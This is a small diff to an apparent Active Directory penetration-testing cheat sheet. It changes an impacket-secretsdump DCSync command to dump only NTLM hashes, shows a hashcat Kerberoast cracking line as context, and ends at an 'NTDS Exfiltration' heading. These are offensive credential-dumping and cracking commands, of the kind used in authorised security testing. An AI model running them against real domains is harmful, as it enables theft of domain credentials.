@@ -131,7 +131,7 @@ hashcat -m 13100 hashes.kerberoast wordlist -O
 
 DCSync exploit :
 ```markdown
-impacket-secretsdump -just-dc <domain>/<user>:<password>@<ipaddress>
+impacket-secretsdump -just-dc-ntlm <domain>/<user>:<password>@<ipaddress>
 ```
 
 ### NTDS Exfiltration
